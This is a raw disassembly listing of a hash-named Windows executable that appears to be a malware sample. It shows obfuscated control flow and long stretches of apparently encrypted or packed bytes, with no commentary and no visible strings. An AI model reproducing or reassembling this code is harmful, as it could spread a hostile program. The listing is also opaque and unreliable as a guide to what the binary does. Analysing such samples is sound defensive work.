
bd0fac227481cd7506e7af6c5750bbc31cd8b5ba1d420a46d7a51a07eccd4b0d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	adc    ecx,0x4d2f
  40100a:	add    BYTE PTR [eax],al
  40100c:	add    al,BYTE PTR [eax]
  40100e:	add    BYTE PTR [eax],al
  401010:	cmp    al,BYTE PTR [eax]
  401012:	add    BYTE PTR [eax],al
  401014:	add    BYTE PTR [eax],al
  401016:	add    DWORD PTR [eax],eax
  401018:	add    BYTE PTR [edx-0x74ab0000],bh
  40101e:	in     al,dx
  40101f:	sub    esp,0x30
  401022:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  401029:	mov    eax,ds:0x44d414
  40102e:	adc    eax,DWORD PTR ds:0x44d428
  401034:	mov    ds:0x44d414,eax
  401039:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  401040:	xor    ecx,0x17d8
  401046:	mov    ecx,DWORD PTR [ebp-0x4]
  401049:	push   ebx
  40104a:	and    DWORD PTR ds:0x447994,0x0
  401054:	xor    eax,eax
  401056:	add    eax,DWORD PTR ds:0x447994
  40105c:	inc    eax
  40105d:	mov    ds:0x447994,eax
  401062:	cmp    DWORD PTR ds:0x447994,0xa
  401069:	jne    0x40108c
  40106f:	push   DWORD PTR [ebp-0x10]
  401072:	push   DWORD PTR [ebp-0x28]
  401075:	push   DWORD PTR [ebp-0x20]
  401078:	push   0x74f6
  40107d:	push   DWORD PTR [ebp-0x24]
  401080:	push   DWORD PTR [ebp-0x28]
  401083:	push   DWORD PTR [ebp-0x20]
  401086:	call   DWORD PTR ds:0x4420c4
  40108c:	cmp    DWORD PTR ds:0x447994,0x9
  401093:	jne    0x4010a4
  401099:	mov    eax,ds:0x447994
  40109e:	inc    eax
  40109f:	mov    ds:0x447994,eax
  4010a4:	cmp    DWORD PTR ds:0x447994,0x17
  4010ab:	jb     0x401054
  4010b1:	add    DWORD PTR ds:0x447980,ecx
  4010b7:	mov    eax,0x7510857
  4010bc:	xor    ecx,eax
  4010be:	xor    DWORD PTR ds:0x44a6dc,0x226
  4010c8:	mov    ebx,0x32729e
  4010cd:	not    DWORD PTR ds:0x44a6e0
  4010d3:	jmp    0x4011a6
  4010d8:	dec    esi
  4010d9:	dec    edx
  4010da:	xor    al,0x5c
  4010dc:	fcom   DWORD PTR [edx+0x66]
  4010df:	jp     0x4010bd
  4010e1:	test   DWORD PTR [ebx+0x58],0x2960cb1e
  4010e8:	jl     0x401166
  4010ea:	jl     0x401168
  4010ec:	mov    ds:0xcc7c7c7c,al
  4010f1:	(bad)  
  4010f2:	xor    ecx,ebx
  4010f4:	xor    eax,0xcaddcfdb
  4010f9:	ja     0x401171
  4010fb:	or     ecx,DWORD PTR [edi]
  4010fd:	push   es
  4010fe:	or     cl,BYTE PTR [edi]
  401100:	cmp    ecx,DWORD PTR [edi]
  401102:	retf   0x3712
  401105:	sbb    bl,BYTE PTR [edi]
  401107:	mov    ch,0x52
  401109:	or     ah,BYTE PTR [edi-0x4e10f32f]
  40110f:	rol    esp,cl
  401111:	or     ecx,DWORD PTR [esp+edx*1+0x4da8e6bc]
  401118:	sbb    DWORD PTR [ecx+0x541fb4dc],esp
  40111e:	out    dx,al
  40111f:	outs   dx,DWORD PTR ds:[esi]
  401120:	add    ebx,DWORD PTR ds:0x4ac4729e
  401126:	mov    al,ds:0x36dd215b
  40112b:	mov    eax,ds:0xa3c97380
  401131:	je     0x401169
  401133:	fisttp DWORD PTR [ebp+0x359ac4f5]
  401139:	jecxz  0x401175
  40113b:	and    ebp,0x4f
  40113e:	aam    0x94
  401140:	dec    ebp
  401141:	inc    DWORD PTR [edi-0x2f5a886e]
  401147:	mov    cl,0x41
  401149:	loope  0x40116f
  40114b:	pop    ecx
  40114c:	sub    edi,DWORD PTR [eax-0x41639320]
  401152:	jae    0x401171
  401154:	retf   
  401155:	cwde   
  401156:	sub    eax,0xc85ce3c6
  40115b:	(bad)  
  40115c:	mov    dl,0xfa
  40115e:	loopne 0x4010f8
  401160:	cmp    eax,0xc76966cf
  401165:	sub    al,cl
  401167:	or     ch,dl
  401169:	sbb    eax,0xb39945d
  40116e:	outs   dx,DWORD PTR ds:[esi]
  40116f:	ins    DWORD PTR es:[edi],dx
  401170:	jb     0x401174
  401172:	cmp    eax,0x22468cd1
  401177:	jns    0x4011f8
  401179:	cmp    al,0x8f
  40117b:	add    bl,dl
  40117d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40117e:	add    edx,DWORD PTR [ebx+0x59]
  401181:	rol    esp,1
  401183:	add    eax,0x15d55edb
  401188:	jge    0x401126
  40118a:	mov    ah,0x43
  40118c:	daa    
  40118d:	sbb    DWORD PTR [ebx],esp
  40118f:	addr16 and eax,0x4f3cdb10
  401195:	loop   0x401158
  401197:	xchg   esi,eax
  401198:	inc    esp
  401199:	mov    bh,BYTE PTR [edx+0x5bbc6975]
  40119f:	inc    edi
  4011a0:	push   ss
  4011a1:	call   0xcb03:0x17327906
  4011a8:	adc    DWORD PTR ds:0x424736,0x44d418
  4011b2:	mov    DWORD PTR [ebp-0x1c],ecx
  4011b5:	xor    DWORD PTR ds:0x41074f,0x5a6f
  4011bf:	mov    ecx,DWORD PTR [ebp+0x14]
  4011c2:	adc    DWORD PTR ds:0x44d414,0x424732
  4011cc:	jmp    0x40129f
  4011d1:	inc    edi
  4011d2:	in     eax,0x24
  4011d4:	xor    bh,BYTE PTR [edx+0x6b7d7dcd]
  4011da:	inc    ebp
  4011db:	in     al,dx
  4011dc:	xchg   BYTE PTR [ecx],bh
  4011de:	mov    eax,ds:0x7ca2eeb0
  4011e3:	jl     0x401261
  4011e5:	mov    ds:0x1a7c7c7c,al
  4011ea:	test   ch,cl
  4011ec:	inc    edi
  4011ed:	pop    esi
  4011ee:	call   0xff13a67
  4011f3:	(bad)  
  4011f4:	add    al,0x90
  4011f6:	mov    al,ds:0x44fbbcb2
  4011fb:	xor    esp,eax
  4011fd:	mov    dh,BYTE PTR [edi]
  4011ff:	sub    ecx,DWORD PTR [ecx+0x2aefb2]
  401205:	(bad)  [ecx-0xc]
  401208:	lock mov DWORD PTR [edi],0x83a7f25d
  40120f:	mov    ebp,0x97f5ec99
  401214:	dec    esi
  401215:	jnp    0x401207
  401217:	daa    
  401218:	mov    dl,0xf4
  40121a:	icebp  
  40121b:	inc    eax
  40121c:	sbb    al,0x87
  40121e:	pop    es
  40121f:	sbb    eax,0x1a866ac
  401224:	test   al,0x12
  401226:	lods   al,BYTE PTR ds:[esi]
  401227:	loop   0x4011c7
  401229:	test   DWORD PTR [eax+0x70],ebx
  40122c:	jae    0x4012a8
  40122e:	ja     0x4011cb
  401230:	pop    es
  401231:	into   
  401232:	push   es
  401233:	sub    al,0x86
  401235:	test   cl,ah
  401237:	mov    esp,0x5bca2eca
  40123c:	dec    edi
  40123d:	std    
  40123e:	shl    DWORD PTR [ecx+ecx*4+0x28],0x4d
  401243:	or     DWORD PTR [ecx],eax
  401245:	jle    0x4012bf
  401247:	jns    0x401245
  401249:	cmp    BYTE PTR [eax],0xb0
  40124c:	test   eax,0x357705cb
  401251:	fiadd  DWORD PTR [eax]
  401253:	ds mov ebx,edi
  401256:	mov    bh,0x70
  401258:	cmp    esi,esi
  40125a:	cmp    al,0xcf
  40125c:	and    bh,dl
  40125e:	(bad)  
  401260:	data16 mov ah,0xe2
  401263:	cld    
  401264:	mov    esp,0x1c165d93
  401269:	arpl   WORD PTR ds:0x7fa0e7b6,sp
  40126f:	xor    dh,ch
  401271:	in     eax,0xc7
  401273:	call   0xdfdd:0x664e5f11
  40127a:	ss jb  0x4012be
  40127d:	push   0x555d8ef0
  401282:	add    eax,0x50246b92
  401287:	xor    edx,DWORD PTR [ebx]
  401289:	lar    esp,WORD PTR ds:0x24877b35
  401290:	dec    ebx
  401291:	sub    edx,DWORD PTR [esi-0x173a6c40]
  401297:	daa    
  401298:	adc    al,0x6b
  40129a:	leave  
  40129b:	ss add ecx,edi
  40129e:	loope  0x4012f6
  4012a0:	push   edi
  4012a1:	test   ecx,ecx
  4012a3:	mov    DWORD PTR ds:0x42473a,0x53ab
  4012ad:	je     0x401398
  4012b3:	and    ecx,ecx
  4012b5:	mov    ecx,DWORD PTR [ebp+0x14]
  4012b8:	and    edi,edi
  4012ba:	jmp    0x40138d
  4012bf:	xchg   DWORD PTR [edi-0x31],eax
  4012c2:	or     ecx,edi
  4012c4:	mov    ebx,DWORD PTR [ebx+0x5b]
  4012c7:	dec    esi
  4012c8:	popa   
  4012c9:	enter  0x3fc,0x23
  4012cd:	jb     0x4012dc
  4012cf:	call   0xa2bc8f53
  4012d4:	jl     0x401352
  4012d6:	jl     0x40132c
  4012d8:	mov    al,ds:0x8539ff2e
  4012dd:	xor    esi,DWORD PTR [esi-0x46]
  4012e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012e1:	les    edx,FWORD PTR [edi]
  4012e3:	add    dl,BYTE PTR [esi]
  4012e5:	xor    dl,cl
  4012e7:	test   eax,0x28a0f7e8
  4012ec:	mov    WORD PTR [esi+0x1f],es
  4012ef:	nop
  4012f0:	and    al,0xb6
  4012f2:	push   ss
  4012f3:	dec    esp
  4012f4:	sub    al,0x5b
  4012f6:	hlt    
  4012f7:	push   cs
  4012f8:	jmp    0x4012e0
  4012fa:	push   esi
  4012fb:	scas   eax,DWORD PTR es:[edi]
  4012fc:	outs   dx,BYTE PTR ds:[esi]
  4012fd:	loop   0x401329
  4012ff:	add    dh,0x9
  401302:	in     al,0x5a
  401304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401305:	ret    
  401306:	dec    esp
  401307:	icebp  
  401308:	jge    0x4012b7
  40130a:	mov    bl,ah
  40130c:	rcl    DWORD PTR [ebp-0x6d7992ee],cl
  401312:	stos   BYTE PTR es:[edi],al
  401313:	inc    edx
  401314:	and    al,0xe6
  401316:	or     esi,DWORD PTR [edi-0x166ea06f]
  40131c:	push   ebp
  40131d:	inc    ebx
  40131e:	mov    WORD PTR ds:0x9f989d7a,gs
  401324:	jl     0x4012d1
  401326:	mov    cl,0x8d
  401328:	jmp    DWORD PTR [edi]
  40132a:	rol    BYTE PTR ds:0x6181a146,1
  401330:	pop    eax
  401331:	inc    edx
  401332:	call   0xeeccaf8
  401337:	sbb    dh,ah
  401339:	jg     0x401318
  40133b:	push   ss
  40133c:	out    dx,al
  40133d:	stos   DWORD PTR es:[edi],eax
  40133e:	cdq    
  40133f:	sub    eax,0xa9f93186
  401344:	ror    BYTE PTR [edi],0x9
  401347:	ret    
  401348:	pop    es
  401349:	add    ch,BYTE PTR [edx-0x5fa79ae8]
  40134f:	inc    ecx
  401350:	outs   dx,BYTE PTR ds:[esi]
  401351:	jne    0x401337
  401353:	sbb    dh,0xdb
  401356:	push   es
  401357:	dec    edi
  401358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401359:	and    BYTE PTR [ebx],0x82
  40135c:	adc    dh,dh
  40135e:	lahf   
  40135f:	sbb    BYTE PTR [edi-0x40],0x99
  401363:	sar    eax,1
  401365:	lock push edx
  401367:	fdivr  st(1),st
  401369:	cli    
  40136a:	xchg   ebx,eax
  40136b:	dec    eax
  40136c:	xchg   BYTE PTR [edi-0x104afb5b],bh
  401372:	inc    ebp
  401373:	cwde   
  401374:	add    eax,DWORD PTR [esi+0x28]
  401377:	push   ebp
  401378:	mov    ebp,0xdb2ca43f
  40137d:	inc    esp
  40137e:	je     0x401389
  401380:	add    al,BYTE PTR [ebp-0xd6da2c1]
  401386:	jb     0x4013ff
  401388:	test   DWORD PTR [ecx+0x35],ebx
  40138b:	loopne 0x4013bc
  40138d:	mov    ecx,DWORD PTR [ecx]
  40138f:	sub    DWORD PTR ds:0x41074f,ebx
  401395:	mov    DWORD PTR [ebp-0x1c],ecx
  401398:	sbb    esi,ecx
  40139a:	imul   edx,eax
  40139d:	and    DWORD PTR ds:0x424732,0x618e
  4013a7:	mov    ecx,0x4573
  4013ac:	mov    DWORD PTR ds:0x44a6d8,0x19
  4013b6:	cmp    DWORD PTR ds:0x44a6d8,0x0
  4013bd:	je     0x4013f3
  4013c3:	cmp    DWORD PTR ds:0x44a6d8,0x1a
  4013ca:	jne    0x4013d9
  4013d0:	push   DWORD PTR [ebp-0x1c]
  4013d3:	call   DWORD PTR ds:0x442338
  4013d9:	xor    edi,edi
  4013db:	or     edi,DWORD PTR ds:0x44a6d8
  4013e1:	dec    edi
  4013e2:	mov    DWORD PTR ds:0x44a6d8,edi
  4013e8:	jmp    0x4013b6
  4013ed:	xor    DWORD PTR ds:0x447980,edx
  4013f3:	add    edx,ecx
  4013f5:	inc    edi
  4013f6:	mov    esi,0x7879
  4013fb:	add    DWORD PTR ds:0x44a6e8,edx
  401401:	mov    edi,0x1556
  401406:	sub    DWORD PTR ds:0x4479a4,0x41074b
  401410:	xchg   esi,ecx
  401412:	xor    DWORD PTR ds:0x44d420,ecx
  401418:	sub    edx,edi
  40141a:	or     ecx,0x50d4
  401420:	xor    esi,esi
  401422:	mov    DWORD PTR [ebp-0x28],esi
  401425:	movzx  ecx,WORD PTR ds:0x44d420
  40142c:	xor    DWORD PTR ds:0x44d414,ecx
  401432:	mov    DWORD PTR [ebp-0x2c],esi
  401435:	or     ecx,0x6619
  40143b:	mov    DWORD PTR [ebp-0x14],esi
  40143e:	mov    ecx,DWORD PTR ds:0x410757
  401444:	xor    DWORD PTR ds:0x42472a,ecx
  40144a:	jmp    0x40151d
  40144f:	ficom  WORD PTR [esi+0x7b7d5fa5]
  401455:	loop   0x401400
  401457:	sbb    al,0x21
  401459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40145a:	out    dx,eax
  40145b:	stos   BYTE PTR es:[edi],al
  40145c:	mov    BYTE PTR [ecx+0x5f],dl
  40145f:	push   ds
  401460:	jle    0x4014de
  401462:	jl     0x401406
  401464:	jl     0x4014e2
  401466:	jl     0x401433
  401468:	cwde   
  401469:	inc    ecx
  40146a:	cmp    eax,0xac566c84
  40146f:	(bad)  
  401471:	xor    eax,0x55e8dd3c
  401476:	and    esi,DWORD PTR [edx-0x2ddd55cc]
  40147c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40147d:	ror    BYTE PTR [edx],0xac
  401480:	(bad)  
  401481:	je     0x4014d0
  401483:	outs   dx,BYTE PTR ds:[esi]
  401484:	ret    0x2107
  401487:	lds    ecx,FWORD PTR [eax]
  401489:	add    eax,0x46baa6b6
  40148e:	outs   dx,DWORD PTR ds:[esi]
  40148f:	push   edx
  401490:	out    0x8c,al
  401492:	push   ss
  401493:	sub    ch,ah
  401495:	cdq    
  401496:	stos   DWORD PTR es:[edi],eax
  401497:	fmul   st(3),st
  401499:	add    bl,bl
  40149b:	fst    QWORD PTR [esi-0x21dc41ee]
  4014a1:	sbb    BYTE PTR [ebx+0x35],ch
  4014a4:	inc    edx
  4014a5:	add    DWORD PTR [ebp-0x5f4c5d4],esi
  4014ab:	out    dx,al
  4014ac:	mov    bl,0x3d
  4014ae:	shl    DWORD PTR [esi],0xef
  4014b1:	test   BYTE PTR [edx-0x56],0x85
  4014b5:	mov    WORD PTR [edi-0x59],bp
  4014b9:	call   0x55bd:0x14bbffab
  4014c0:	jge    0x401539
  4014c2:	dec    esi
  4014c3:	je     0x401542
  4014c5:	in     eax,0xdf
  4014c7:	jo     0x401510
  4014c9:	pop    ecx
  4014ca:	pop    esi
  4014cb:	(bad)  
  4014cc:	sti    
  4014cd:	cmp    edi,DWORD PTR [edi+esi*1+0x285f538a]
  4014d4:	call   0xf19c0843
  4014d9:	mov    dh,0x84
  4014db:	lods   eax,DWORD PTR ds:[esi]
  4014dc:	repz cmp DWORD PTR [ebx+0x44],edx
  4014e0:	push   ecx
  4014e1:	mov    bl,dl
  4014e3:	inc    edx
  4014e4:	aam    0x23
  4014e6:	sar    BYTE PTR [ecx+0xc9e416d],1
  4014ec:	push   esp
  4014ed:	jno    0x401490
  4014ef:	ror    DWORD PTR [esi-0x2629f967],0x69
  4014f6:	jae    0x401484
  4014f8:	pop    es
  4014f9:	or     dl,BYTE PTR [esi]
  4014fb:	or     al,BYTE PTR [ecx-0x513769dd]
  401501:	aas    
  401502:	repnz out 0xc0,al
  401505:	mov    eax,DWORD PTR [ecx+0x3b]
  401508:	pop    ds
  401509:	pop    esp
  40150a:	jno    0x401516
  40150c:	enter  0xddf7,0x42
  401510:	and    eax,0x6ddad341
  401515:	cli    
  401516:	mov    esi,0x184eef82
  40151b:	aad    0xc
  40151d:	mov    DWORD PTR [ebp-0x8],esi
  401520:	jmp    0x4015f3
  401525:	add    DWORD PTR [eax],edi
  401527:	repz push esp
  401529:	lods   eax,DWORD PTR ds:[esi]
  40152a:	addr16 std 
  40152c:	jge    0x401526
  40152e:	stc    
  40152f:	icebp  
  401530:	sahf   
  401531:	fbld   TBYTE PTR [edx+0x7e44c6b2]
  401537:	jl     0x4015b5
  401539:	mov    ds:0x267c7c7c,al
  40153e:	pop    es
  40153f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401540:	cmp    al,0x34
  401542:	imul   ebx,DWORD PTR [ebx-0x33fe7e22],0x31e3d948
  40154c:	pop    ds
  40154d:	mov    al,0x61
  40154f:	in     al,0x68
  401551:	adc    BYTE PTR [edi-0x50],dh
  401554:	push   ds
  401555:	pop    es
  401556:	jne    0x4015bf
  401558:	outs   dx,DWORD PTR ds:[esi]
  401559:	out    0xb2,al
  40155b:	repz test DWORD PTR [ebp+0x3a97093b],eax
  401562:	mov    eax,0x50ddb3ca
  401567:	xchg   DWORD PTR [ecx+0x4a30c650],edx
  40156d:	pop    eax
  40156e:	repnz int 0x1b
  401571:	dec    esp
  401572:	cmp    edi,esp
  401574:	jo     0x4015f4
  401576:	add    DWORD PTR [eax],esi
  401578:	or     al,0x98
  40157a:	fcmove st,st(2)
  40157c:	bound  eax,QWORD PTR [ecx-0x37d77e52]
  401582:	pop    edi
  401583:	or     dh,BYTE PTR [ecx-0x146b3c66]
  401589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40158a:	inc    edx
  40158b:	fadd   DWORD PTR [ebx+0x27124859]
  401591:	and    dh,BYTE PTR [edx]
  401593:	cld    
  401594:	or     edi,ecx
  401596:	fst    QWORD PTR [eax]
  401598:	pushf  
  401599:	xor    edi,DWORD PTR [esi+esi*1-0x218acc81]
  4015a0:	adc    al,0xc4
  4015a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015a3:	mov    bl,0x71
  4015a5:	and    eax,0x29c2e719
  4015aa:	add    al,0x58
  4015ac:	fidivr DWORD PTR [esi+0xcca8058]
  4015b2:	xchg   ecx,eax
  4015b3:	jbe    0x40159b
  4015b5:	inc    esp
  4015b6:	xchg   esp,eax
  4015b7:	push   es
  4015b8:	aas    
  4015b9:	les    esp,FWORD PTR [esi-0x199d6dff]
  4015bf:	mov    ecx,DWORD PTR [eax-0x7a]
  4015c2:	xchg   esp,eax
  4015c3:	push   edx
  4015c4:	pusha  
  4015c5:	jne    0x40161d
  4015c7:	mov    ss,ebx
  4015c9:	mov    al,BYTE PTR [ebx+0x25]
  4015cc:	mov    ah,0x58
  4015ce:	mul    DWORD PTR [ecx+0x4ecfaf4b]
  4015d4:	and    ebp,DWORD PTR [ebx+0x2b307f5c]
  4015da:	mov    edi,0x1d90d759
  4015df:	xor    BYTE PTR [edi],0x59
  4015e2:	out    dx,al
  4015e3:	dec    edi
  4015e4:	or     BYTE PTR [edx-0x14],bh
  4015e7:	xor    al,0x1b
  4015e9:	add    DWORD PTR ds:0xb1438253,esi
  4015ef:	pop    esp
  4015f0:	push   ebx
  4015f1:	repnz mov ecx,DWORD PTR gs:[ebp-0x18]
  4015f6:	sbb    DWORD PTR ds:0x410743,0x410747
  401600:	xor    ecx,eax
  401602:	mov    DWORD PTR ds:0x41074b,0x13
  40160c:	cmp    DWORD PTR ds:0x41074b,0x0
  401613:	je     0x401657
  401619:	cmp    DWORD PTR ds:0x41074b,0x2
  401620:	jne    0x40162f
  401626:	push   DWORD PTR [ebp-0xc]
  401629:	call   DWORD PTR ds:0x44233c
  40162f:	cmp    DWORD PTR ds:0x41074b,0x3
  401636:	jne    0x401647
  40163c:	mov    eax,ds:0x41074b
  401641:	dec    eax
  401642:	mov    ds:0x41074b,eax
  401647:	mov    eax,ds:0x41074b
  40164c:	dec    eax
  40164d:	mov    ds:0x41074b,eax
  401652:	jmp    0x40160c
  401657:	xor    edi,edi
  401659:	add    ecx,ebx
  40165b:	mov    eax,ds:0x42473e
  401660:	mov    DWORD PTR [ebp-0x20],ecx
  401663:	mov    eax,DWORD PTR [ebp-0x20]
  401666:	mov    DWORD PTR ds:0x410747,0x348
  401670:	je     0x402298
  401676:	mov    eax,DWORD PTR [ebp-0x4]
  401679:	xor    DWORD PTR ds:0x44a6d8,0x44d410
  401683:	xor    eax,0x7510857
  401688:	jmp    0x40175b
  40168d:	in     eax,0x57
  40168f:	iret   
  401690:	call   0x2571:0x577dba5d
  401697:	mov    esi,0xc658266a
  40169c:	ret    0x718a
  40169f:	jl     0x40171d
  4016a1:	mov    ds:0xb87c7c7c,al
  4016a6:	call   0xcc350151
  4016ab:	jb     0x401701
  4016ad:	into   
  4016ae:	and    eax,0x8b6aee54
  4016b3:	loope  0x40163d
  4016b5:	pop    es
  4016b6:	das    
  4016b7:	sbb    edx,0x7c98ea01
  4016bd:	inc    edx
  4016be:	mov    bh,0xd5
  4016c0:	scas   eax,DWORD PTR es:[edi]
  4016c1:	leave  
  4016c2:	adc    al,0xc6
  4016c4:	mov    ebp,0x5b02c522
  4016c9:	push   es
  4016ca:	ins    BYTE PTR es:[edi],dx
  4016cb:	sbb    DWORD PTR [ebx-0x1],0x76dbe656
  4016d2:	dec    eax
  4016d3:	(bad)  
  4016d4:	repz rcl esp,1
  4016d7:	push   es
  4016d8:	sbb    ecx,DWORD PTR [eax-0x451b0f8c]
  4016de:	mov    esp,0xcfdfae12
  4016e3:	pop    ss
  4016e4:	lods   eax,DWORD PTR ds:[esi]
  4016e5:	pop    edx
  4016e6:	cmp    BYTE PTR [esi-0x5a],ah
  4016e9:	mov    esp,0x3325c46e
  4016ee:	cld    
  4016ef:	iret   
  4016f0:	dec    esi
  4016f1:	xlat   BYTE PTR ds:[ebx]
  4016f2:	dec    ebp
  4016f3:	adc    dl,BYTE PTR [ebx+0x1246006b]
  4016f9:	dec    ebx
  4016fa:	jnp    0x401698
  4016fc:	sbb    DWORD PTR [edx],ecx
  4016fe:	inc    esi
  4016ff:	cmp    al,0x59
  401701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401702:	sbb    DWORD PTR [ecx+0x34],ebx
  401705:	imul   eax,DWORD PTR [eax],0x2d5cafba
  40170b:	adc    BYTE PTR [ebx],ch
  40170d:	or     ebx,ebx
  40170f:	out    dx,al
  401710:	dec    ebp
  401711:	xor    DWORD PTR ds:0x71f0c8d8,0xffffff98
  401718:	cs jmp 0xe032aa45
  40171e:	cmp    DWORD PTR [edi],0xc3948e94
  401724:	mov    eax,ds:0x3023d552
  401729:	push   esp
  40172a:	enter  0xb44c,0xf0
  40172e:	jbe    0x40178e
  401730:	jecxz  0x4016c3
  401732:	push   cs
  401733:	in     eax,0x7f
  401735:	inc    edx
  401736:	popf   
  401737:	pushf  
  401738:	scas   al,BYTE PTR es:[edi]
  401739:	push   ss
  40173a:	cmp    DWORD PTR [ebp+0x17a82d16],0x7c
  401741:	icebp  
  401742:	jnp    0x40175d
  401744:	mov    bh,0xef
  401746:	hlt    
  401747:	gs mov ah,0xd4
  40174a:	shl    DWORD PTR [edi-0x35a5bdcd],1
  401750:	pop    ss
  401751:	sti    
  401752:	dec    ecx
  401753:	shl    BYTE PTR [ebx+ebx*1+0x56],1
  401757:	cmp    bl,BYTE PTR [ebx-0x7f]
  40175a:	loope  0x40175f
  40175c:	ret    
  40175d:	mov    DWORD PTR ds:0x4479a4,0x156f
  401767:	cmp    edi,eax
  401769:	mov    DWORD PTR ds:0x44d414,0x5e58
  401773:	jne    0x401eef
  401779:	push   DWORD PTR [ebp+0x8]
  40177c:	add    DWORD PTR ds:0x44a6e4,0x4479a0
  401786:	call   0x409b25
  40178b:	mov    DWORD PTR ds:0x44d414,0x72d4
  401795:	mov    DWORD PTR [ebp-0x20],eax
  401798:	and    DWORD PTR ds:0x41073f,0x0
  4017a2:	jmp    0x4017b4
  4017a7:	mov    ecx,DWORD PTR ds:0x41073f
  4017ad:	inc    ecx
  4017ae:	mov    DWORD PTR ds:0x41073f,ecx
  4017b4:	cmp    DWORD PTR ds:0x41073f,0x16
  4017bb:	jae    0x4018af
  4017c1:	cmp    DWORD PTR ds:0x41073f,0x25
  4017c8:	jne    0x4017d7
  4017ce:	push   DWORD PTR [ebp-0x1c]
  4017d1:	call   DWORD PTR ds:0x442340
  4017d7:	jmp    0x4017a7
  4017dc:	jmp    0x4018af
  4017e1:	fdiv   st(2),st
  4017e3:	jmp    0xef7a:0x5462fa52
  4017ea:	into   
  4017eb:	outs   dx,DWORD PTR ds:[esi]
  4017ec:	inc    ecx
  4017ed:	dec    edx
  4017ee:	(bad)  
  4017f0:	nop
  4017f1:	xor    BYTE PTR [eax+0x7c],dh
  4017f4:	jl     0x401798
  4017f6:	jl     0x401874
  4017f8:	jl     0x4017a8
  4017fa:	dec    BYTE PTR [eax-0x1a]
  4017fd:	sbb    eax,DWORD PTR [ecx-0x375f42f1]
  401803:	retf   0x6d14
  401806:	mov    ah,0xc3
  401808:	js     0x4017b3
  40180a:	daa    
  40180b:	out    0x82,eax
  40180d:	sub    BYTE PTR [esi+0x56],al
  401810:	cld    
  401811:	cdq    
  401812:	add    bl,BYTE PTR [eax+0x6b526be5]
  401818:	pop    eax
  401819:	aad    0x8f
  40181b:	jmp    0xe2895064
  401820:	dec    eax
  401821:	es stos DWORD PTR es:[edi],eax
  401823:	push   ebx
  401824:	push   ebp
  401825:	inc    esp
  401826:	(bad)  
  401827:	push   esp
  401828:	sub    esp,eax
  40182a:	push   ebp
  40182b:	and    esi,esi
  40182d:	sbb    BYTE PTR [ecx-0x5f6b6791],bh
  401833:	and    bh,0x60
  401836:	xchg   ebp,eax
  401837:	rcl    BYTE PTR [edx-0x4c],0x40
  40183b:	dec    ecx
  40183c:	test   BYTE PTR [ebx-0x204363ff],ah
  401842:	aaa    
  401843:	daa    
  401844:	and    DWORD PTR [edx],0xffffffbe
  401847:	(bad)  
  401848:	repnz dec edi
  40184a:	dec    edx
  40184b:	pop    ss
  40184c:	adc    BYTE PTR [ebp-0x60],bh
  40184f:	mov    cl,0x11
  401851:	cmc    
  401852:	inc    eax
  401853:	mov    bl,0xab
  401855:	adc    edi,ebx
  401857:	jb     0x4018cb
  401859:	jae    0x40180b
  40185b:	push   ebp
  40185c:	push   ecx
  40185d:	adc    eax,0x14684c77
  401862:	mov    al,ds:0x7759dbe6
  401867:	sbb    DWORD PTR [ecx-0x11987620],ebx
  40186d:	out    dx,al
  40186e:	dec    ebp
  40186f:	and    al,0xa0
  401871:	xchg   esi,eax
  401872:	xchg   esi,eax
  401873:	or     al,0xa4
  401875:	push   esi
  401876:	xchg   esp,eax
  401877:	jbe    0x401850
  401879:	lods   al,BYTE PTR ds:[esi]
  40187a:	dec    ecx
  40187b:	and    bh,BYTE PTR [edx+0x60]
  40187e:	pop    esi
  40187f:	and    eax,0xce1ef7de
  401884:	inc    edi
  401885:	mov    dh,0xfa
  401887:	gs icebp 
  401889:	stos   DWORD PTR es:[edi],eax
  40188a:	addr16 in eax,0x87
  40188d:	sti    
  40188e:	fs add dh,cl
  401891:	dec    esp
  401892:	out    dx,al
  401893:	fmul   DWORD PTR [ecx-0x320523a0]
  401899:	and    al,BYTE PTR [edi+edx*8]
  40189c:	cmc    
  40189d:	push   0x4c
  40189f:	mov    ebx,0xf9146e73
  4018a4:	shr    ebp,1
  4018a6:	cmp    DWORD PTR [ecx],eax
  4018a8:	dec    ecx
  4018a9:	repnz cdq 
  4018ab:	jmp    0xfc45:0x8bf20267
  4018b2:	xor    DWORD PTR ds:0x44d40c,edi
  4018b8:	mov    ecx,DWORD PTR [ebp-0x20]
  4018bb:	adc    DWORD PTR ds:0x44a6d4,ebx
  4018c1:	mov    esi,0x7510857
  4018c6:	xor    eax,esi
  4018c8:	adc    DWORD PTR ds:0x44798c,0x42473e
  4018d2:	add    eax,ebx
  4018d4:	mov    DWORD PTR ds:0x447998,0x1172
  4018de:	cmp    ecx,eax
  4018e0:	mov    DWORD PTR ds:0x44799c,0x309e
  4018ea:	je     0x4021a9
  4018f0:	sub    DWORD PTR ds:0x41074b,0x410743
  4018fa:	push   DWORD PTR [ebp-0x20]
  4018fd:	jmp    0x4019d0
  401902:	js     0x40197b
  401904:	dec    ecx
  401905:	mov    bh,BYTE PTR [ebp+0x4a]
  401908:	jnp    0x401903
  40190a:	hlt    
  40190b:	push   esi
  40190c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40190d:	imul   ebp,esp,0xffffffa5
  401910:	ret    0x6690
  401913:	jo     0x401991
  401915:	jl     0x4018b9
  401917:	jl     0x401995
  401919:	jl     0x401981
  40191b:	dec    ecx
  40191c:	jecxz  0x4018c0
  40191e:	push   0xffffffdc
  401920:	pop    esi
  401921:	pop    ecx
  401922:	jle    0x401923
  401924:	or     esp,DWORD PTR [ebx-0x5e]
  401927:	loope  0x401942
  401929:	xchg   ebp,eax
  40192a:	push   0x838a2f1c
  40192f:	fimul  DWORD PTR [ecx-0x51821d51]
  401935:	sub    eax,DWORD PTR [esi+0x854071a]
